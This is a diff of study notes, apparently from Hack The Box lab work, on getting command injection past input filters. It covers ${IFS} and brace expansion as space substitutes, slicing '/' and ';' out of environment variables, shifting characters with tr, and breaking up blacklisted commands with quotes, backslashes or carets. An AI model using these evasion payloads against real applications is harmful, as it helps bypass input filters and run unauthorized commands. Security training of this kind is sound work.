@@ -11,23 +11,32 @@ exec in NodeJS
 
 If only has front end control, use Burp repeater to bypass
 
-绕过空格:
-  tab
-  ${IFS}  $IFS            默认是空格或tab
-  {ls,-la}                自动在ls和-la之间，加入空格
-  https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space
+If controls on back end:
+  绕过空格:
+    tab
+    ${IFS}  $IFS            默认是空格或tab
+    {ls,-la}                自动在ls和-la之间，加入空格
+    https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space
+  
+  绕过/反斜杠:
+    ${PATH}                   /usr/local/bin:/usr/bin:/bin:/usr/games
+    echo ${PATH:0:1}          /
+    echo ${LS_COLORS:10:1}    ;
+  
+    if  %HOMEPATH% = \Users\htb-student
+    echo %HOMEPATH:~6,-11%      \            start from \ , end by \
+    $env:HOMEPATH[0]            \
+  
+    字符移位 (shifting characters)
+    echo $(tr '!-}' '"-~'<<<[)      \            [ = 91, \ = 92
 
-绕过/反斜杠:
-  ${PATH}                   /usr/local/bin:/usr/bin:/bin:/usr/games
-  echo ${PATH:0:1}          /
-  echo ${LS_COLORS:10:1}    ;
+  绕过命令黑名单：
+    wh'o'am'i'
+    w"ho"a:mi"
 
-  if  %HOMEPATH% = \Users\htb-student
-  echo %HOMEPATH:~6,-11%      \            start from \ , end by \
-  $env:HOMEPATH[0]            \
+    w\ho\am\i      only Linux
+    w^ho^am^i      only Windows
 
-  字符移位 (shifting characters)
-  echo $(tr '!-}' '"-~'<<<[)      \            [ = 91, \ = 92
 
 
 
